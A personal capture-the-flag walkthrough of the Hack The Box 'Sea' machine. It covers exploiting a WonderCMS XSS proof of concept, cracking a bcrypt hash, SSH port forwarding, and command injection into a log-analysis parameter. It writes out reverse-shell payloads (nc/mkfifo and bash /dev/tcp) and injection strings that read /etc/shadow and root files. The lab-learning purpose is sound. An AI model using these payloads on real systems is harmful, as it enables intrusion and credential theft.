`sudo nmap -sC -sV -vv IP`
initial scans show ports 22 and 80 open
The webpage on 80 showss a bicycle themed background with the text "velik71"
A "contact us" page takes us to sea.htb, which is not reachable, so put that to /etc/hosts

Others did a lot of fuzzing into subdirs inside sea.htb
But I did a search for "velik71", which lead me to a github page of the creator working on that theme, which got me the version of the cms and its name
WonderCMS 3.2.0 -- quick search showed it is vulnerable to xss, and a poc exploit

To fiind the login page was the reral challenge. A writeup suggested they looked up for wonderCMS login page, which lead to /loginURL

That would be the input for the exploit
`exploit.py sea.htb/loginURL 10.10.14.31 1234`
`nc -lvnp 1234`

There are things we need to take care of, since the POC isnt working properly.
First, we see the POC is pulling a main.zip from their github. we'll wget that into the place where the POC's pthon -m 8000 is located.
Then we see that we're getting a hit, on the python server, but not reverse shell.
So we look at the code in the xss.js that the POC generated. Seems like a variable is not doing its job. we change basename to hostname, and urlWithtBaseLog is now sea.thb instead of a /
Even now the rev shell isnt getting caught.
So we look at the rev shell, where ther IP and PORTs arent set to our IP,port. but there is an input option.
So in the url, we add it
http://sea.htb/themes/revshell-main/rev.shell?lhost=10.10.14.31&lport=1234
Now, we get a reverse shell
www-data

---
First thing we do is check the database config file.
Usually, in the /var/www
But since we know it is apache2 server, we go to /etc/apache2/sites-enabled
It shows /var/www/sea. In there, data/database.js has the password hash as bcrypt(\$2y2\$)
We need to escape the backslashes before we put it into hashcat -m 3200
my checmicalromance
check for usernames possible in `cat /etc/passwd | grep bash$`
`su amay` --> password

---
check for open ports listening internally
`ss -ntlp` and forward interesting ones through ssh port forwarding
`ssh -L 8081:127.0.0.1:8080 amay@10.129.235.216`
visit http://127.0.0.1:8081 prompted for login, use amay creds, and we're in

We see the 
analyze logs button sends a POST request, like so log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=
So, tried to do php code injection in User-Agent field , which did not work. But it is kinda cool ho we did it.
`curl http://seaIP/Catchme -x http://localhost:8080` our burp, since is listening on 8080, will catc this. no we modify the caught packet in the User-Agent field, and inject php. but dint work.

Next, we try command injection, by adding ;id; before &analyze_log=
log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log==;id;==&analyze_log=
This did something wierd. So we just replaced the log file with /etc/passwd
log_file=/etc/passwd&analyze_log=
This gave us the passwd file, same with shadow file, but couldnt get admin hash

After some combis, we try log_file=/etc/shadow==;==&analyze_log=
this gave us the root hash
Also, was able to get root.txt from logfile=/root/root.txt;&analyze.log=

log_file=/root/root.txt;mkfifo /tmp/f; nc 10.10.14.31 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1;rm tmp/f;%23&analyze_log=
gave us a reverse shell, but it died instantly
So, we went with IppSec, and put nohup
but we had to go with a different reverse shell bash -i one''

log_file=/root/root.txt/bash -c 'nohup bash -i >& /dev/tcp/10.10.14.31/4444 0>&1 &';#%23&analyze_log=